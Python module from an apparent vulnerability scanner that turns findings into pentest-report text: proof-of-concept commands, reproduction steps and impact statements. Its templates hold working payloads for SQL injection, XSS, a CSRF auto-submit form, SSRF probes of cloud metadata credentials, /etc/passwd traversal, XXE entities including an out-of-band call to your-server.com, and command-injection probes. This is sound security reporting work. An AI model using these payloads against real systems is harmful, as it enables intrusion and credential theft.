"""
scanner/report_enricher.py  v2.1.0
====================================
Enterprise-grade report enrichment:
- PoC, steps to reproduce, impact scenario (deterministic, no AI)
- XSS steps now reference the browser simulation panel in the HTML report
- CSRF steps include raw HTTP request/response context note
- SQLi steps reference the captured HTTP response body
- New: CMDi, LFI, SSRF, XXE, Open Port, CVE Match enrichment improved

Note: HTTPEvidenceCapture in evidence_collector.py runs AFTER this module
and attaches 'http_evidence' dicts to findings.  This module is responsible
for the human-readable PoC/steps/impact only.
"""

from __future__ import annotations
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


def _base_url(url: str) -> str:
    """Return scheme+host+path, stripping the query string."""
    p = urlparse(url)
    return urlunparse((p.scheme, p.netloc, p.path, "", "", ""))


def _clean_poc_url(url: str, param: str, payload: str) -> str:
    """
    Build a PoC URL with the payload in the correct parameter — exactly once.

    The scanner often embeds the payload in the URL it stores on the finding
    (e.g. index.jsp?content=%3Cscript%3E or sendFeedback?cfile=comments.txt%3Bid).
    Naively appending ?param=payload again produces a broken double-parameter URL.

    This function:
      1. Parses the existing query string.
      2. Replaces (or adds) the named parameter with the clean payload.
      3. Rebuilds the URL — result always has param exactly once.
    """
    if not param or param.strip() in ("N/A", ""):
        return url

    parsed = urlparse(url)
    qs     = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]          # overwrite whatever the scanner stored
    clean  = urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, urlencode(qs, doseq=True), ""
    ))
    return clean


def _is_dom_xss_static(ftype_l: str, payload: str) -> bool:
    """
    True when this is a static-analysis DOM sink detection (innerHTML found in
    a JS file) rather than a confirmed reflected payload.  Payload is N/A.
    """
    return "dom" in ftype_l and payload.strip().upper() in ("N/A", "", "NONE")


def _infer_method(url: str) -> str:
    u = (url or "").lower()
    if any(k in u for k in ("login", "dologin", "signin", "auth", "subscribe", "feedback", "submit", "register")):
        return "POST"
    return "GET"


def _classify_param(param: str) -> str:
    p = (param or "").lower()
    if any(k in p for k in ("file", "path", "dir", "page", "template", "content", "include")):
        return "file/path-like"
    if any(k in p for k in ("cmd", "exec", "shell", "job", "process")):
        return "command-like"
    if any(k in p for k in ("id", "uid", "user", "acct", "account", "pass", "password", "email", "name", "query", "search")):
        return "text/input-like"
    return "generic"



def _enrich_open_redirect(f: dict) -> dict:
    """Enrich open redirect finding with PoC and impact."""
    url   = f.get("url", "")
    param = f.get("parameter", "")
    payload = f.get("payload", "")
    poc_url = f"{url.split('?')[0]}?{param}={payload}" if param not in ("N/A", "") else url

    steps_or = [
            f"1. Navigate to the following URL in a browser: {poc_url}",
            "2. Observe that the browser is redirected to the external/attacker-controlled destination.",
            "3. Confirm that the redirect originates from the trusted application domain.",
            "4. Craft a phishing email containing this URL — victims see the trusted domain in the link.",
    ]
    f["report"] = {
        "poc": poc_url,
        "steps_to_reproduce": steps_or,
        "steps": steps_or,
        "impact_scenario": (
            "Attackers can craft URLs on the trusted domain that redirect victims to malicious pages. "
            "This dramatically increases phishing success rates because email filters and users trust the originating domain."
        ),
        "affected_param": param,
    }
    return f


def _enrich_method_tampering(f: dict) -> dict:
    """Enrich HTTP method tampering finding with PoC."""
    url    = f.get("url", "")
    method = f.get("payload", "TRACE")

    mt_steps = [
            f"1. Send an HTTP {method} request to: {url}",
            f"   Example: curl -X {method} {url} -v",
            f"2. Observe the server response (expected: 405 Method Not Allowed; actual: 200).",
            "3. For TRACE: check that the response body echoes back the request headers.",
            "4. Verify the Allow header in the OPTIONS response to confirm the method is listed.",
    ]
    f["report"] = {
        "poc": f"curl -X {method} {url} -v",
        "steps_to_reproduce": mt_steps,
        "steps": mt_steps,
        "impact_scenario": (
            f"HTTP {method} is enabled — this expands the attack surface. "
            "TRACE specifically enables Cross-Site Tracing (XST), allowing bypass of HttpOnly cookie protection."
        ),
        "affected_param": "HTTP Method",
    }
    return f


def enrich_findings(findings: list[dict]) -> list[dict]:
    return [enrich_finding(f) for f in findings]


def _generic_steps_to_reproduce(f: dict) -> list[str]:
    """Consultant-grade minimum steps when no module-specific template matched."""
    url = str(f.get("url", "") or "")
    param = str(f.get("parameter", "") or f.get("param", "") or "")
    payload = str(f.get("payload", "") or "")
    ftype = str(f.get("type", "") or "issue")
    method = _infer_method(url)
    lines = [
        f"1. Identify the affected asset and endpoint documented for this {ftype} finding.",
        f"2. Re-send traffic to `{url}` using {method} (see Technical Details and evidence blocks).",
    ]
    if param and param.upper() not in ("N/A", ""):
        lines.append(
            f"3. Manipulate input parameter `{param}` — test payload: `{payload[:180] or '<payload>'}`.",
        )
    else:
        lines.append(
            "3. Replay or modify the request described in the evidence until the behaviour matches the report.",
        )
    lines.extend(
        [
            "4. Capture the HTTP request and response (e.g., Burp, ZAP, browser DevTools) for the engagement record.",
            "5. Compare the vulnerable behaviour with a patched or hardened baseline to confirm remediation.",
        ]
    )
    return lines


def enrich_finding(finding: dict) -> dict:
    f = dict(finding)
    if f.get("chain"):
        return f

    # Route to specialised enrichers for new finding types
    ftype_l = f.get("type", "").lower()
    if "open redirect" in ftype_l:
        f = _enrich_open_redirect(f)
        _ensure_http_evidence(f)
        return f
    if "method tamper" in ftype_l or ("trace" in ftype_l and "enabled" in ftype_l):
        f = _enrich_method_tampering(f)
        _ensure_http_evidence(f)
        return f

    ftype  = str(f.get("type", "") or "")
    ftype_l = ftype.lower()
    url    = str(f.get("url", "") or "")
    param  = str(f.get("parameter", "") or "")
    payload= str(f.get("payload", "") or "")
    evidence=str(f.get("evidence", "") or "")
    conf   = (f.get("validation", {}) or {}).get("confidence_label", "MEDIUM")
    http_ev = (f.get("http_evidence", {}) or {}) if isinstance(f.get("http_evidence", {}), dict) else {}
    method = _infer_method(url)
    pclass = _classify_param(param)

    poc    = None
    steps: list[str] = []
    impact = None
    preconditions: list[str] = []

    # ── SQL Injection ──────────────────────────────────────────────────────
    if "sqli" in ftype_l or "sql injection" in ftype_l or "sql" in ftype_l:
        if method == "POST":
            curl_cmd = f"curl -s -X POST '{_base_url(url)}' -d '{param}={payload}'"
        else:
            poc_url  = _clean_poc_url(url, param, payload)
            curl_cmd = f"curl -g '{poc_url}'"
        response_hint = str(http_ev.get("response_body", "")).strip()
        if response_hint:
            response_hint = response_hint[:180].replace("\n", " ")
        else:
            response_hint = "No captured body yet; reproduce and inspect DB error or response differential."
        poc = (
            f"URL:       {_base_url(url)}\n"
            f"Method:    {method}\n"
            f"Parameter: {param}\n"
            f"ParamType: {pclass}\n"
            f"Payload:   {payload}\n\n"
            f"cURL equivalent:\n"
            f"  {curl_cmd}\n\n"
            f"Observed response snippet:\n"
            f"  {response_hint}"
        )
        if "error-based" in ftype_l:
            steps = [
                f"Send a GET/POST request to `{url}` with `{param}` set to the payload above.",
                "Observe a database error message in the HTTP response body (see 'HTTP Response Evidence' panel).",
                "The error reveals database version, table names, or query structure.",
                "Confirm the error disappears when the parameter contains a benign value.",
            ]
            impact = (
                "An attacker can extract the database schema and contents via error messages, "
                "bypass authentication, modify or delete data, and potentially achieve remote "
                "code execution if the database user has FILE/EXEC privileges."
            )
        elif "boolean" in ftype_l:
            steps = [
                f"Send a baseline request to `{url}` with a normal value for `{param}`.",
                f"Send a TRUE-condition payload: `{param}=' OR '1'='1' --`.",
                f"Send a FALSE-condition payload: `{param}=' OR '1'='2' --`.",
                "Observe consistent, measurable differences between TRUE and FALSE responses (content length, keyword presence).",
                "Use sqlmap `--technique=B` to automate data extraction.",
            ]
            impact = (
                "Blind boolean-based SQL injection allows an attacker to infer all database contents "
                "character by character.  Full data extraction is possible with automated tools."
            )
        elif "time-based" in ftype_l:
            steps = [
                f"Record the baseline response time for `{url}` with a normal value.",
                f"Send the time-delay payload to `{param}`: e.g., `'; WAITFOR DELAY '0:0:5' --`.",
                "Confirm the response is delayed by ≥5 seconds on repeated attempts.",
                "Use sqlmap `--technique=T` to extract data blind via timing.",
            ]
            impact = (
                "Time-based blind SQL injection enables full database exfiltration even when errors "
                "and response differentials are suppressed.  All data is recoverable with sufficient time."
            )
        else:
            steps = [
                f"Send the request to `{url}` with `{param}={payload}`.",
                "Observe the HTTP response for SQL injection indicators (see 'HTTP Response Evidence').",
                "Confirm the behaviour is reproducible and differs from baseline.",
            ]
            impact = (
                "SQL injection can lead to data breach, authentication bypass, data corruption, "
                "and full application compromise."
            )

    # ── XSS ────────────────────────────────────────────────────────────────
    elif "xss" in ftype_l or "template injection" in ftype_l or "ssti" in ftype_l:
        is_static_dom = _is_dom_xss_static(ftype_l, payload)
        if is_static_dom:
            poc = (
                "Static DOM-XSS sink detection (not a confirmed reflected payload).\n"
                f"JavaScript source: {url}\n"
                "Indicator: dangerous sink usage such as .innerHTML / eval / document.write"
            )
            steps = [
                f"Open `{url}` and review the JavaScript source.",
                "Search for dangerous sinks (`innerHTML`, `outerHTML`, `document.write`, `eval`).",
                "Trace data flow to confirm whether user-controlled input can reach the sink.",
                "If user input reaches the sink without sanitization, classify as exploitable DOM XSS.",
                "Do not treat this as confirmed browser execution until source-to-sink flow is proven.",
            ]
            impact = (
                "If user-controlled data reaches the detected sink, attackers can execute arbitrary JavaScript "
                "in victims' browsers. This can lead to session theft, phishing redirection, and account takeover."
            )
        else:
            crafted_url = _clean_poc_url(url, param, payload)
            poc = (
                f"Crafted URL:\n"
                f"  {crafted_url}\n\n"
                f"Alternatively, in a browser:\n"
                f"  1. Navigate to {url}\n"
                f"  2. Enter the payload into the '{param}' field: {payload}\n"
                f"  3. Observe the alert() dialog confirming JavaScript execution\n"
                f"     (see 'Browser XSS Simulation' panel in this report)"
            )
            steps = [
                f"Open `{url}` in a browser.",
                f"Inject `{payload}` into the `{param}` field or URL parameter.",
                "Observe the payload reflected in the HTTP response inside an executable HTML context.",
                "Confirm JavaScript execution: an alert() dialog (or equivalent DOM manipulation) appears.",
                "The 'Browser XSS Simulation' panel above illustrates the user-visible impact.",
                "For stored XSS: submit the payload, then load the page where it is displayed — all visitors are affected.",
            ]
            impact = (
                "An attacker can execute arbitrary JavaScript in victims' browsers: steal session cookies "
                "(HttpOnly permitting), perform actions as the authenticated user, redirect to phishing pages, "
                "install keyloggers, or escalate to account takeover.  If stored, every page visitor is affected."
            )

    # ── CSRF ────────────────────────────────────────────────────────────────
    elif "csrf" in ftype_l:
        preconditions = [
            "Victim must be authenticated to the target application.",
            "Victim must visit attacker-controlled content that submits the forged request.",
        ]
        poc = (
            f"Target endpoint: {url}\n\n"
            "Precondition:\n"
            "- Victim must be authenticated to the target application.\n"
            "- Victim must visit attacker-controlled content.\n\n"
            f"Cross-site HTML PoC (host on attacker.com and trick victim to visit):\n"
            f"<html><body onload=\"document.forms[0].submit()\">\n"
            f"  <form method=\"POST\" action=\"{url}\">\n"
            f"    <input name=\"email\" value=\"attacker@evil.com\">\n"
            f"    <!-- No CSRF token required — form submits successfully -->\n"
            f"  </form>\n"
            f"</body></html>\n\n"
            f"Raw HTTP evidence: see 'CSRF HTTP Request/Response Evidence' panel."
        )
        steps = [
            f"Identify the state-changing endpoint at `{url}`.",
            "Confirm no anti-CSRF token is present in the form, or that Origin/Referer validation is absent.",
            "Review the raw GET/POST request-response pair in the 'CSRF HTTP Request/Response Evidence' panel — "
            "the POST succeeds with no token.",
            "Copy the HTML PoC above onto attacker-controlled infrastructure.",
            "While the victim is authenticated, have them visit the PoC page.",
            "Observe the cross-origin request execute successfully (HTTP 200/302 redirect).",
        ]
        impact = (
            "An attacker can force any authenticated user to perform unwanted state-changing actions: "
            "change password/email, transfer funds, modify account settings, delete data — "
            "without any interaction beyond visiting a malicious link or page."
        )

    # ── Command Injection ───────────────────────────────────────────────────
    elif "cmdi" in ftype_l or "command injection" in ftype_l:
        poc_url = _clean_poc_url(url, param, payload)   # param appears exactly once
        response_hint = str(http_ev.get("response_body", "")).strip()
        if response_hint:
            response_hint = response_hint[:180].replace("\n", " ")
        else:
            response_hint = "No captured body yet."
        is_time = ("time-based" in ftype_l) or any(x in payload.lower() for x in ("sleep", "timeout", "ping"))
        poc = (
            f"URL:       {_base_url(url)}\n"
            f"Method:    {method}\n"
            f"Parameter: {param}\n"
            f"ParamType: {pclass}\n"
            f"Payload:   {payload}\n\n"
            f"cURL equivalent:\n"
            f"  curl -g '{poc_url}'\n\n"
            + (
                "Expected behavior: delayed response (>= 3 seconds) compared to baseline.\n"
                if is_time else
                "Expected behavior: command output signature appears in response body.\n"
            )
            + f"Observed response snippet:\n  {response_hint}\n"
            + "(see 'HTTP Response Evidence' panel)"
        )
        if is_time:
            steps = [
                f"Send request to `{url}` with `{param}` set to the timing payload above.",
                "Measure baseline response time with a benign value.",
                "Confirm repeated delay >= 3 seconds over baseline.",
                "Treat this as blind execution evidence; verify with additional safe timing payloads.",
            ]
        else:
            steps = [
                f"Send a {method} request to `{url}` with `{param}` set to the payload above.",
                "Observe the HTTP response body for command output signatures (e.g., `uid=`, `www-data`).",
                "Try `id`, `whoami`, `uname -a` as alternate payloads to confirm execution.",
                "Document exact request/response pair for reproducibility.",
            ]
        impact = (
            "Potential OS command execution with web-server privileges. Depending on environment hardening, "
            "this may allow file access, data exposure, and lateral movement."
        )

    # ── SSRF ────────────────────────────────────────────────────────────────
    elif "ssrf" in ftype_l:
        meta_url  = _clean_poc_url(url, param, "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        redis_url = _clean_poc_url(url, param, "http://127.0.0.1:6379/")
        mongo_url = _clean_poc_url(url, param, "http://127.0.0.1:27017/")
        poc = (
            f"URL:       {_base_url(url)}\n"
            f"Parameter: {param}\n"
            f"Payload:   {payload}\n\n"
            f"Cloud metadata check:\n"
            f"  curl '{meta_url}'\n\n"
            f"Internal service probe:\n"
            f"  curl '{redis_url}'  (Redis)\n"
            f"  curl '{mongo_url}' (MongoDB)"
        )
        steps = [
            f"Send a request to `{url}` with `{param}` set to `http://169.254.169.254/latest/meta-data/`.",
            "Observe if AWS/GCP/Azure IAM credential metadata appears in the response.",
            "Probe internal ports: `http://127.0.0.1:6379/` for Redis, `http://10.0.0.1/` for internal services.",
            "Use Burp Collaborator or interactsh.com to confirm out-of-band SSRF via DNS resolution.",
        ]
        impact = (
            "SSRF allows an attacker to pivot through the server to access internal services, "
            "read cloud metadata credentials (leading to full cloud account takeover), "
            "enumerate internal network topology, and bypass firewall/IP allowlists."
        )

    # ── LFI / Path Traversal ────────────────────────────────────────────────
    elif "lfi" in ftype_l or "local file" in ftype_l or "path traversal" in ftype_l:
        base = _base_url(url)
        poc = (
            f"URL:       {base}\n"
            f"Parameter: {param}\n"
            f"Payload:   {payload}\n\n"
            f"Test variations:\n"
            f"  {_clean_poc_url(url, param, '../../../etc/passwd')}\n"
            f"  {_clean_poc_url(url, param, '....//....//....//etc/passwd')}\n"
            f"  {_clean_poc_url(url, param, 'php://filter/convert.base64-encode/resource=index.php')}"
        )
        steps = [
            f"Send a request to `{url}` with `{param}={payload}`.",
            "Check the response for file content (e.g., `root:x:0:0:` for `/etc/passwd`).",
            "Attempt `php://filter` wrapper to read PHP source code.",
            "Attempt log poisoning: inject PHP into User-Agent, then LFI to access log file.",
        ]
        impact = (
            "LFI allows reading arbitrary local files including SSH keys, configuration files with "
            "credentials, and PHP source code.  Combined with log poisoning it escalates to "
            "Remote Code Execution."
        )

    # ── XXE ─────────────────────────────────────────────────────────────────
    elif "xxe" in ftype_l:
        poc = (
            f"Endpoint: {url}\n\n"
            f"Malicious XML payload:\n"
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
            f']>\n'
            f'<root>&xxe;</root>\n\n'
            f"Send via HTTP POST with Content-Type: application/xml"
        )
        steps = [
            f"Send the XML payload above as the POST body to `{url}`.",
            "Observe if `/etc/passwd` content appears in the response or error message.",
            "Try `file:///etc/shadow`, `file:///var/www/html/config.php` for credential files.",
            "For blind XXE, use an out-of-band payload: `<!ENTITY xxe SYSTEM \"http://your-server.com/\">`.",
        ]
        impact = (
            "XXE allows reading arbitrary server files, SSRF via external entity loading, "
            "and in some configurations denial-of-service (billion laughs attack).  "
            "Credential disclosure is the most common critical outcome."
        )

    # ── Missing Security Headers ────────────────────────────────────────────
    elif "missing security header" in ftype_l:
        poc = f"Request: GET {url} HTTP/1.1\nMissing headers confirmed in response — see Evidence field."
        steps = [
            f"Send a GET request to `{url}` and inspect the HTTP response headers.",
            "Confirm the listed security headers are absent from the response.",
            "Use browser DevTools (F12 → Network → Response Headers) for visual confirmation.",
            "Test clickjacking: embed the page in an iframe on a cross-origin page — it should load if X-Frame-Options is absent.",
        ]
        impact = (
            "Missing security headers increase the exploitability of other vulnerabilities: "
            "absent CSP amplifies XSS, absent X-Frame-Options enables clickjacking, "
            "absent HSTS enables SSL stripping.  Each missing header is a defense-in-depth failure."
        )

    # ── Exposed Path / File ─────────────────────────────────────────────────
    elif "exposed path" in ftype_l or "exposed path / file" in ftype_l:
        poc = f"GET {url} HTTP/1.1\nHost: {url.split('/')[2] if '//' in url else url}"
        steps = [
            f"Send a GET request to `{url}` and observe the HTTP response code.",
            "HTTP 200: content is directly accessible — review for sensitive data.",
            "HTTP 403/401: the path exists but is access-controlled — confirm the path is not intended to be public.",
            "Check the response body for credentials, backup data, source code, or admin functionality.",
        ]
        impact = (
            "Exposed paths can reveal credentials, source code, configuration files, "
            "backup archives, or admin panels.  Even 403/401 responses confirm the path "
            "exists and increase attack surface."
        )

    # ── Open Port ───────────────────────────────────────────────────────────
    elif ftype_l == "open port":
        port   = f.get("port", "?")
        service= evidence.replace(f"Port {port} open – service: ", "")[:80]
        poc    = f"TCP connect scan confirmed {port}/tcp open on {url}.\nService: {service}"
        steps  = [
            f"Verify: `nc -zv {url} {port}` or `nmap -p {port} {url}`.",
            f"Identify service version: `nmap -sV -p {port} {url}`.",
            "Check for unauthenticated access (e.g., Redis: `redis-cli -h {url}`; MongoDB: `mongo {url}`).",
            "Review service-specific CVEs for the detected version.",
        ]
        impact = (
            f"Port {port} is publicly accessible.  Depending on the service, this may allow "
            "unauthenticated access, brute-force attacks, or exploitation of known CVEs. "
            "High-risk services (Redis, MongoDB, RDP) are commonly unauthenticated by default."
        )

    # ── CVE Match ───────────────────────────────────────────────────────────
    elif "cve" in ftype_l and "match" in ftype_l:
        poc    = f"Banner evidence:\n  {evidence[:200]}"
        steps  = [
            "Retrieve the full CVE advisory from NVD: https://nvd.nist.gov/",
            "Confirm the exact service version matches the vulnerable range.",
            "Check for available patches or mitigations from the vendor.",
            "Apply patches in a test environment before production deployment.",
        ]
        impact = "Publicly known CVE with associated exploit code in many cases — high likelihood of active exploitation in the wild."

    # ── WAF Detected ─────────────────────────────────────────────────────────
    elif "waf status" in ftype_l and "no waf" in ftype_l:
        poc    = f"No WAF fingerprint found in headers, cookies, or response body at {url}."
        steps  = [
            f"Confirm by sending a standard SQLi probe: `curl '{url}?id=1 OR 1=1--'` — no WAF block page returned.",
            "Send an XSS probe and observe the raw application response (no WAF interception).",
            "Consider deploying a WAF (Cloudflare, AWS WAF, or ModSecurity) before this application goes to production.",
        ]
        impact = (
            "No WAF is deployed. All injection, XSS, and CSRF findings in this report are directly "
            "exploitable with no automated request-filtering layer blocking attack payloads. "
            "The absence of a WAF amplifies the risk of every other finding."
        )

    elif "waf" in ftype_l and ("detected" in ftype_l or "status" in ftype_l):
        waf_vendor = ((f.get("details") or {}).get("waf_vendor") or "Unknown")
        poc    = f"WAF fingerprint detected at {url}\nVendor: {waf_vendor}"
        steps  = [
            f"Send a benign probe: `curl -H 'X-Forwarded-For: 127.0.0.1' {url}`.",
            "Send a standard XSS probe and observe if the WAF blocks it.",
            "Note: WAF presence does not eliminate underlying vulnerabilities — bypass payloads may still succeed.",
        ]
        impact = (
            "Informational: A WAF is deployed and may mitigate some attack vectors. "
            "However, WAFs can be bypassed with encoding, fragmentation, or protocol-level techniques. "
            "They do not substitute for secure coding practices."
        )

    # ── Attach report fields if we have useful content ────────────────────
    if poc or steps or impact:
        f["report"] = {
            "confidence":         conf,
            "poc":                poc or "",
            "steps_to_reproduce": steps,
            "impact_scenario":    impact or "",
            "preconditions":      preconditions,
            "parameter_profile":  pclass,
        }

    if not f.get("chain"):
        rep = f.get("report")
        if not isinstance(rep, dict):
            rep = {}
            f["report"] = rep
        st = rep.get("steps_to_reproduce") or rep.get("steps") or []
        if not st:
            rep["steps_to_reproduce"] = _generic_steps_to_reproduce(f)
        elif rep.get("steps") and not rep.get("steps_to_reproduce"):
            rep["steps_to_reproduce"] = list(st)

    # §6.3: Always ensure http_evidence stub is present with request/response/payload
    _ensure_http_evidence(f)

    return f


def _ensure_http_evidence(f: dict) -> None:
    """
    §6.3: Ensure every finding has an http_evidence dict with:
    - request: the HTTP request that triggered the finding
    - response_body: the HTTP response body (or snippet)
    - payload_used: the payload that confirmed the finding

    If values are already set (by EvidenceCollector), they are preserved.
    Otherwise, fills from existing finding fields as best-effort.
    """
    existing = f.get("http_evidence")
    if not isinstance(existing, dict):
        existing = {}

    request_val = existing.get("request") or f.get("request") or ""
    response_val = existing.get("response_body") or f.get("response_body") or f.get("response") or ""
    payload_val  = existing.get("payload_used") or f.get("payload") or ""

    # Build minimal request line if not captured
    if not request_val:
        url   = str(f.get("url", "") or "")
        param = str(f.get("parameter", "") or "")
        pay   = str(f.get("payload", "") or "")
        method = _infer_method(url)
        if method == "POST":
            request_val = f"{method} {url} HTTP/1.1\nContent: {param}={pay}"
        else:
            request_val = f"{method} {url} HTTP/1.1"

    # Build minimal response snippet if not captured
    if not response_val:
        ev = str(f.get("evidence", "") or "")
        if ev and ev.upper() not in ("N/A", ""):
            response_val = ev[:400]

    # §3: Preserve affected_endpoints if already set
    if f.get("affected_endpoints") is None:
        f.setdefault("affected_endpoints", [])
    f["http_evidence"] = {
        "request":       request_val or "N/A",
        "response_body": response_val or "N/A",
        "payload_used":  payload_val or "N/A",
        **{k: v for k, v in existing.items()
           if k not in ("request", "response_body", "payload_used")},
    }
